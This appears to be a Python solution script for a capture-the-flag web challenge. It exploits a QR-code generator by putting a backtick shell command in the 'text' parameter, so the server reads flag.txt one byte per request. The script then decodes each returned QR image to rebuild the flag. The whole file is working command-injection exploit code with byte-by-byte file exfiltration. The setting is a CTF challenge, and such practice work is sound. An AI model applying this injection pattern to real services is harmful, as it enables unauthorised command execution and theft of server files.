#! /usr/bin/env python3
from pyzbar.pyzbar import decode
from PIL import Image
import requests

flag = ""
i = 0
url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr"
params = {}

while "}" not in flag:
    params["text"] = f"`cat flag.txt | dd bs=1 skip={str(i)} count=1 2>/dev/null`"
    resp = requests.get(url, params=params)
    with open('qr.png', 'wb') as fin:
        fin.write(resp.content)
    a = decode(Image.open('qr.png'))
    flag += a[0].data.decode()
    i += 1
print(flag)
